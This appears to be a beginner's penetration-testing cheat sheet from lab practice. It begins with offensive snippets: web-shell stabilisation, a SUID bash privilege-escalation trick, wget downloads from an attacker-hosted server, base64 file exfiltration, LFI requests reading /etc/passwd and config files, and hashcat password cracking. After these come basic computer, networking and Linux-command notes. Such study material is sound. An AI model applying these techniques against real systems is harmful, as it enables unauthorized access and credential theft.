# Guide404
simple guide for noobs

----------------------GENERAL-----------------
(For every domain you find:)
1. nano /etc/hosts
(Harden the web shell)

2. python3 -c 'import pty; pty.spawn("/bin/bash")'   (SHELL HARDERING)
stty raw -echo; fg
export TERM=xterm
or
script /dev/null -c bash
stty raw -echo
fg
reset

3. (move one file from your machine to the target , if you have a ssh connection)
   --> python3 -m http.server 8888 (in the directory of yhe file you want to send)
   --> wget http://<myIP>:<port>/filename   (at target's pc)


4. cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
   cd /tmp
   ./bash -p
   whoami

5. (YOU CANT TAKE A FILE FROM TARGETS MACHINE WITH PYTHON SERVER)
   a. cat filename|base64   (copy it)
   b. nano name.base64     (and put it inside)
   c. cat name.base64|base64 -d>name   (and now you have it at your machine)

   

--------------------LFI---------------------
1. (throught pdf export/download) (known exploitable files: https://github.com/hussein98d/LFI-files/blob/master/list.txt):
   --> (burpsuite) GET /download?filename=../../../../../etc/passwd HTTP/1.1
   --> GET /download?filename=../../config/database.yml HTTP/1.1

-----------------------------HASHES-----------------------------
1. go at hashcat id tables and ctr+F to searc your hash and take the id
2. hashcat -m <id> hash.txt /usr/share/wordlists/rockyou.txt

-----------------------------WEBSHELL-----------------------
(after you get a web shell)
1. python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm
2. cat /var/www/limesurvey/application/config/config.php (you might find password for ssh)





                                                                                             SOME THEORY

A PC has those 5 components:
1)CPU     --> a) ALU (Arithmetic Logic Unit) does calculations   b) CU (Control unit) manage data/orders   c) Registers (short term storaging)  ||||| fetch->Decode->Excecute->Repeat
2)RAM     --> Fast temporary memory --> DDR4/DDR5
3)Hard Disk (ssd/hdd) or new gen (NVMe SSD)     -->SSD (faster,reliable,no noisy)   HDD (Bigger space than ssd, noisy and if it moves it can stop working)   
4)Motherboard
5)GPU
+ input/output devices (I/O)

inputs --> (CPU) processing --> (RAM/HardDisk) storage --> output


-----------------------------------------MEMORY-----------------------------------
overall memories --> a) Registers   b) Cashe (L1, fast but small|||L2,slow but bigger|||L3, even slower but bigger too)   c)RAM   d) HardDisk
when we open a program:
CPU loads it to the RAM from the HardDisk, and CPU reads it from the RAM and stores the data at Cache or Registers
If RAM is full, PC uses some space from HardDisk, like a Virtual Memory ----> Known us Paging (slower than RAM)


---------------------------------------OS--------------------------------
What it does?
1) CPU sheduling
2) RAM-VM sheduling
3) Storage management
4) I/O devices management
5) Files management

it has 4 parts:
1)Kernel: the core/brain of it, it communicates with the hardware and loads the programs at RAM.
2)Shell: the interface for the communication with the user
3)File System: the way the pc stores and manages the files (known ones: NTFS, FAT32, EXT4)
4)Drivers (softwares)

So when i open a PC, the 'Boot loader" loads the OS at RAM, the kernel starts the "start-ups" services and then every time you open a program: the OS loads it to the RAM, CPU execute the orders and the OS handle the data and communication user-program.

-------------------------------------Networking--------------------------------------

The base of nowadays networks are the Nodes and the Links
Types of networks: 
1) LAN
2) WAN
3) WLAN (wireless)
4) VPN
   The protocoles used are:
1)IP  (manages the addresses on the network)
2)TCP (slower but reliable)
3)UDP (fast but not so reliable)

The model that is commonly used is the OSI Model:
That has 7 layers:
7)Application          (HTTP,HTTPS,QUICK) apis
6)Presentation         cryptography
5)Session              manages connections/sessions
4)Transport            TCP/UDP
3)Network              IP
2)Data Link            Machine-Machine
1)Physical             wires/signals

----------------------------------------------------------- Linux Commands ----------------------------------------------------
Command	Description
 man <tool>	      Opens man pages for the specified tool.
<tool> -h         Prints the help page of the tool.
apropos <keyword>	Searches through man pages' descriptions for instances of a given keyword.
cat	            Concatenate and print files.
whoami	         Displays current username.
id	               Returns users identity.
hostname	         Sets or prints the name of the current host system.
uname	            Prints operating system name.
pwd	            Returns working directory name.
ifconfig	         The ifconfig utility is used to assign or view an address to a network interface and/or configure network interface parameters.
ip	               Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels.
netstat	         Shows network status.
ss	               Another utility to investigate sockets.
ps	               Shows process status.
who	            Displays who is logged in.
env	            Prints environment or sets and executes a command.
lsblk	            Lists block devices.
lsusb	            Lists USB devices.
lsof	            Lists opened files.
lspci	            Lists PCI devices.
sudo	            Execute command as a different user.
su	               The su utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser). A shell is then executed.      su username -c "command" (executes a command as another user)
useradd	         Creates a new user or update default new user information.
userdel	         Deletes a user account and related files.
usermod	         Modifies a user account.         --lock username  (option locks/disables the user account)
addgroup	         Adds a group to the system.      -m username  (to create a home directory for a user)
delgroup	         Removes a group from the system.
passwd	         Changes user password.
dpkg	            Install, remove and configure Debian-based packages.
apt	            High-level package management command-line utility.
aptitude	         Alternative to apt.
snap	            Install, remove and configure snap packages.
gem	            Standard package manager for Ruby.
pip	            Standard package manager for Python.
git	            Revision control system command-line utility.
systemctl	      Command-line based service and systemd control manager.
ps	               Prints a snapshot of the current processes.
journalctl	      Query the systemd journal.
kill	            Sends a signal to a process.
bg	               Puts a process into background.
jobs	            Lists all processes that are running in the background.
fg	               Puts a process into the foreground.
curl	            Command-line utility to transfer data from or to a server.
wget	            An alternative to curl that downloads files from FTP or HTTP(s) server.
python3 -m http.server	Starts a Python3 web server on TCP port 8000.
ls	               Lists directory contents.
cd	               Changes the directory.
clear	            Clears the terminal.
touch	            Creates an empty file.
mkdir	            Creates a directory.
tree	            Lists the contents of a directory recursively.
mv	               Move or rename files or directories.
cp	               Copy files or directories.
nano	            Terminal based text editor.
which	            Returns the path to a file or link.
find	            Searches for files in a directory hierarchy.
updatedb	         Updates the locale database for existing contents on the system.
locate	         Uses the locale database to find contents on the system.
more	            Pager that is used to read STDOUT or files.
less	            An alternative to more with more features.
head	            Prints the first ten lines of STDOUT or a file.
tail	            Prints the last ten lines of STDOUT or a file.
sort	            Sorts the contents of STDOUT or a file.
grep	            Searches for specific results that contain given patterns.   grep -v "flase" (excludes all the "flase" files)
cut	            Removes sections from each line of files.    cut -d":" -f1 (it cuts everything after the first :)
tr	               Replaces certain characters.         tr ":" " "    (so here we replace all the : with empty)
column	         Command-line based utility that formats its input into multiple columns.         best is column -t
awk	            Pattern scanning and processing language.      awk '{print $1, $NF}'  (print the first and the last result of a line)
sed	            A stream editor for filtering and transforming text.     sed 's/bin/HTB/g' (it replaces bin with HTB at all lines)
wc	               Prints newline, word, and byte counts for a given input.   (wc -l) => counts the lines of an output
chmod	            Changes permission of a file or directory.
chown	            Changes the owner and group of a file or directory.

ABOUT SHORT COMMAND:
-type f	         Hereby, we define the type of the searched object. In this case, 'f' stands for 'file'.
-name *.conf	   With '-name', we indicate the name of the file we are looking for. The asterisk (*) stands for 'all' files with the '.conf' extension.
-user root	      This option filters all files whose owner is the root user.
-size +20k	      We can then filter all the located files and specify that we only want to see the files that are larger than 20 KiB.
-newermt 2020-03-03	With this option, we set the date. Only files newer than the specified date will be presented.
-exec ls -al {} \;	This option executes the specified command, using the curly brackets as placeholders for each result. The backslash escapes the next character from being interpreted by the shell because otherwise, the semicolon would terminate the command and not reach the redirection.
2>/dev/null	         This is a STDERR redirection to the 'null device', which we will come back to in the next section. This redirection ensures that no errors are displayed in the terminal. This redirection must not be an option of the 'find' command.

example: find / -type f -name "*.conf" -newermt 2020-03-03 -size +25k -size -28k 2>/dev/null



STDIN/OUT/ERR:

Data Stream for Input
STDIN – 0
Data Stream for Output
STDOUT – 1
Data Stream for Output that relates to an error occurring.
STDERR – 2


When we use the greater-than sign (>) to redirect our STDOUT, a new file is automatically created if it does not already exist. If this file exists, it will be overwritten without asking for confirmation. If we want to append STDOUT to our existing file, we can use the double greater-than sign (>>).

example: athleticKid@htb[/htb]$ find /etc/ -name passwd >> stdout.txt 2>/dev/null
this find the /etc/passwd files and write them at the end of file stdout.txt, while the errors (2) goes at the null device (nowhere)

example 2: cat << EOF > stream.txt
you give inputs until you press "EOF", then all are load in the txt file





